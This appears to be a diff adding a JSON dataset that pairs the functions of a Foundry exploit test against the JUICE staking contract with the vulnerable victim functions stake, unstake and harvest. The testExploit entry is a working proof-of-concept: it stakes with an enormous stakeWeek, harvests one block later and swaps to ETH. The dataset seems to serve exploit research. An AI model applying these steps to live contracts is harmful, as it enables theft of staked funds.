@@ -1,0 +1,107 @@
+[
+  {
+    "contract/interface": "Juice",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Juice",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Juice",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Juice",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Juice",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Juice",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", blocknumToForkFrom);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Juice",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Juice",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Juice",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Juice",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Juice",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Juice",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Juice",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"[Start] Attacker ETH balance before exploit\", address(this).balance, 18);\n\n        //stake 0.5 ETH\n        ETHtoJUICE(0.5 ether);\n        JUICE.approve(address(JuiceStaking), type(uint256).max);\n        JuiceStaking.stake(JUICE.balanceOf(address(this)), 3_000_000_000);\n\n        // harvest JUICE token a block later\n        vm.roll(block.number + 1);\n        vm.warp(block.timestamp + 12);\n        JuiceStaking.harvest(0);\n        JUICE.approve(address(Router), type(uint256).max);\n        JUICEtoETH();\n\n        // Log balances after exploit\n        emit log_named_decimal_uint(\"[End] Attacker ETH Balance After exploit\", address(this).balance, 18);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IStake",
+    "source_type": "victim_contract",
+    "function_name": "harvest",
+    "original_code": "\tfunction harvest(uint256 stakeCount) external {\n\t    require(mapStakingInfo[address(msg.sender)][stakeCount].stakedAmount > 0, \"Staking not found\");\n\t\trequire(mapStakingInfo[address(msg.sender)][stakeCount].unstakeStatus == 0, \"Staking already unstake\");\n\t\t\n\t\t_updatePool();\n\t\t\n\t\t(uint256 pending, uint256 bonus) = pendingReward(address(msg.sender), stakeCount);\n\t\tIERC20(Juice).safeTransfer(address(msg.sender), (pending + bonus));\n\t\t\n\t\tmapStakingInfo[address(msg.sender)][stakeCount].rewardDebt += pending;\n        emit Harvest(msg.sender, (pending + bonus));\n    }\n\t\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IStake",
+    "source_type": "victim_contract",
+    "function_name": "stake",
+    "original_code": "\tfunction stake(uint256 amount, uint256 stakeWeek) external {\n\t    require(IERC20(Juice).balanceOf(address(msg.sender)) >= amount, \"Balance not available for staking\");\n\t\trequire(stakeWeek > 0, \"stakeWeek must be greater than or equal to one\");\n\t\trequire(stakingStartTime > 0, \"Staking is not started yet\");\n\t\trequire(stakingEndTime > block.timestamp, \"Staking is closed\");\n\t\t\n\t\t_updatePool();\n\t\t\n\t\tuint256 stakeCount = stakingCount[address(msg.sender)];\n\t\t\n\t\tIERC20(Juice).safeTransferFrom(address(msg.sender), address(this), amount);\n\t\tJuiceStaked += amount;\n\t\tstakingCount[address(msg.sender)] += 1;\n\t\t\n\t\tmapStakingInfo[address(msg.sender)][stakeCount].stakedAmount = amount;\n\t\tmapStakingInfo[address(msg.sender)][stakeCount].startTime = block.timestamp;\n\t\tmapStakingInfo[address(msg.sender)][stakeCount].endTime = block.timestamp + (stakeWeek * 7 days);\n\t\tmapStakingInfo[address(msg.sender)][stakeCount].stakingWeek = stakeWeek;\n\t\tmapStakingInfo[address(msg.sender)][stakeCount].rewardDebt = (amount * rewardPerShare) / precisionFactor;\n        emit Stake(address(msg.sender), amount);\n    }\n\t\n\tfunction unstake(uint256 stakeCount) external {\n\t    require(mapStakingInfo[address(msg.sender)][stakeCount].stakedAmount > 0, \"Staking not found\");\n\t\trequire(mapStakingInfo[address(msg.sender)][stakeCount].unstakeStatus == 0, \"Staking already unstake\");\n\t\t\n\t\t_updatePool();\n\t\t\n\t    if(block.timestamp >= mapStakingInfo[address(msg.sender)][stakeCount].endTime) \n\t\t{\n\t\t    (uint256 pending, uint256 bonus) = pendingReward(address(msg.sender), stakeCount);\n\t\t    uint256 amount = mapStakingInfo[address(msg.sender)][stakeCount].stakedAmount;\n\t\t\t\n\t\t    IERC20(Juice).safeTransfer(address(msg.sender), (amount + pending + bonus));\n\t\t\t\n\t\t    JuiceStaked -= amount;\n\t\t    mapStakingInfo[address(msg.sender)][stakeCount].unstakeStatus = 1;\n\t\t    mapStakingInfo[address(msg.sender)][stakeCount].rewardDebt += pending;\n\t\t    emit Unstake(address(msg.sender), (amount + pending + bonus));\n        }\n    }\n\t\n\tfunction harvest(uint256 stakeCount) external {\n\t    require(mapStakingInfo[address(msg.sender)][stakeCount].stakedAmount > 0, \"Staking not found\");\n\t\trequire(mapStakingInfo[address(msg.sender)][stakeCount].unstakeStatus == 0, \"Staking already unstake\");\n\t\t\n\t\t_updatePool();\n\t\t\n\t\t(uint256 pending, uint256 bonus) = pendingReward(address(msg.sender), stakeCount);\n\t\tIERC20(Juice).safeTransfer(address(msg.sender), (pending + bonus));\n\t\t\n\t\tmapStakingInfo[address(msg.sender)][stakeCount].rewardDebt += pending;\n        emit Harvest(msg.sender, (pending + bonus));\n    }\n\t\n",
+    "description": ""
+  }
+]
